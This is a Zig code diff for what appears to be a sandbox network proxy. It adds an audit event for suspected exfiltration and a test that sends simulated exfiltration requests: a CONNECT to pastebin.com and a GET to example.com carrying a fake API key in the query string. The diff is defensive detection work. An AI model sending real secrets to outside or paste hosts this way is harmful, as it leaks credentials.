@@ -354,6 +354,14 @@ fn handleConnection(state: *State, io: std.Io, client: std.Io.net.Stream) !void 
     defer decision.deinit(state.allocator);
     state.record(.network_connect_attempt, decision.redacted_target, null) catch {};
 
+    // RT-03 F-audit: annotate-only — emit exfil findings even when allow.
+    // Visible surfaces only: CONNECT is host:port; cleartext absolute-form may
+    // include path/query. Not body, headers, or TLS payload. Flushed end-of-run
+    // via Runtime.snapshotAuditEvents (not mid-CONNECT live stream).
+    if (decision.exfil_findings.len > 0) {
+        state.record(.network_exfiltration_suspected, decision.redacted_target, decision.decision) catch {};
+    }
+
     if (!(decision.decision.result == .allow or decision.decision.result == .observe)) {
         state.record(.network_connect_denied, decision.redacted_target, decision.decision) catch {};
         try writeProxyError(io, client, 403, "Forbidden");
@@ -1650,5 +1658,115 @@ test "proxy deinit reclaims quiet open tunnel within bound" {
     if (client_open) {
         client.close(io);
         client_open = false;
+    }
+}
+
+test "proxy F-audit records exfil on allow for sink host and cleartext secret query" {
+    // RT-03 F-audit: annotate-only even when allow. CONNECT host-class sinks fire;
+    // cleartext absolute-form secret query fires; plain CONNECT non-sink does not.
+    if (@import("builtin").os.tag == .windows) return error.SkipZigTest;
+
+    var loaded = try @import("orca_core").policy.load.parseFromSlice(std.testing.allocator,
+        \\version: 1
+        \\mode: observe
+        \\network:
+        \\  mode: open
+        \\  backend: proxy
+        \\  detect_exfiltration:
+        \\    dns: true
+        \\    long_query_strings: true
+        \\    secret_patterns: true
+    , "proxy-f-audit.yaml");
+    defer loaded.deinit();
+
+    const io = std.testing.io;
+    var runtime = try start(std.testing.allocator, &loaded, .observe);
+    defer runtime.deinit();
+    std.Io.sleep(io, std.Io.Duration.fromNanoseconds(50 * std.time.ns_per_ms), .awake) catch {};
+    const proxy_port = try bindPort(runtime.bindUrl());
+    const proxy_addr = try std.Io.net.IpAddress.parse("127.0.0.1", proxy_port);
+
+    // 1) CONNECT non-sink (api.github.com) — no exfil event expected for host-class.
+    {
+        var client = try std.Io.net.IpAddress.connect(&proxy_addr, io, .{ .mode = .stream });
+        defer client.close(io);
+        const req = "CONNECT api.github.com:443 HTTP/1.1\r\nHost: api.github.com:443\r\n\r\n";
+        var write_buf: [256]u8 = undefined;
+        var writer = client.writer(io, &write_buf);
+        try writer.interface.writeAll(req);
+        try writer.interface.flush();
+        var response_buf: [512]u8 = undefined;
+        _ = readHttpResponse(io, client, &response_buf) catch {};
+    }
+    try runtime.waitForIdle(2 * std.time.ns_per_s);
+    {
+        const events = try runtime.snapshotAuditEvents(std.testing.allocator);
+        defer runtime.freeAuditEvents(std.testing.allocator, events);
+        var saw_exfil = false;
+        for (events) |ev| {
+            if (ev.event_type == .network_exfiltration_suspected) saw_exfil = true;
+        }
+        try std.testing.expect(!saw_exfil);
+    }
+
+    // 2) CONNECT paste sink — annotate + allow (open mode).
+    {
+        var client = try std.Io.net.IpAddress.connect(&proxy_addr, io, .{ .mode = .stream });
+        defer client.close(io);
+        const req = "CONNECT pastebin.com:443 HTTP/1.1\r\nHost: pastebin.com:443\r\n\r\n";
+        var write_buf: [256]u8 = undefined;
+        var writer = client.writer(io, &write_buf);
+        try writer.interface.writeAll(req);
+        try writer.interface.flush();
+        var response_buf: [512]u8 = undefined;
+        _ = readHttpResponse(io, client, &response_buf) catch {};
+    }
+    try runtime.waitForIdle(2 * std.time.ns_per_s);
+    {
+        const events = try runtime.snapshotAuditEvents(std.testing.allocator);
+        defer runtime.freeAuditEvents(std.testing.allocator, events);
+        var saw_exfil = false;
+        var saw_allowed = false;
+        for (events) |ev| {
+            if (ev.event_type == .network_exfiltration_suspected and
+                std.mem.indexOf(u8, ev.target, "pastebin.com") != null)
+                saw_exfil = true;
+            if (ev.event_type == .network_connect_allowed and
+                std.mem.indexOf(u8, ev.target, "pastebin.com") != null)
+                saw_allowed = true;
+        }
+        try std.testing.expect(saw_exfil);
+        try std.testing.expect(saw_allowed);
+    }
+
+    // 3) Cleartext absolute-form HTTP with secret query — findings on visible path/query.
+    {
+        var client = try std.Io.net.IpAddress.connect(&proxy_addr, io, .{ .mode = .stream });
+        defer client.close(io);
+        const req =
+            "GET http://example.com/path?token=sk-fakeSyntheticOpenAIKey1234567890 HTTP/1.1\r\n" ++
+            "Host: example.com\r\nConnection: close\r\n\r\n";
+        var write_buf: [512]u8 = undefined;
+        var writer = client.writer(io, &write_buf);
+        try writer.interface.writeAll(req);
+        try writer.interface.flush();
+        var response_buf: [512]u8 = undefined;
+        _ = readHttpResponse(io, client, &response_buf) catch {};
+    }
+    try runtime.waitForIdle(2 * std.time.ns_per_s);
+    {
+        const events = try runtime.snapshotAuditEvents(std.testing.allocator);
+        defer runtime.freeAuditEvents(std.testing.allocator, events);
+        var saw_secret_exfil = false;
+        for (events) |ev| {
+            if (ev.event_type == .network_exfiltration_suspected and
+                std.mem.indexOf(u8, ev.target, "example.com") != null)
+            {
+                // Redacted target must not contain the raw synthetic secret.
+                try std.testing.expect(std.mem.indexOf(u8, ev.target, "sk-fakeSyntheticOpenAIKey") == null);
+                saw_secret_exfil = true;
+            }
+        }
+        try std.testing.expect(saw_secret_exfil);
     }
 }
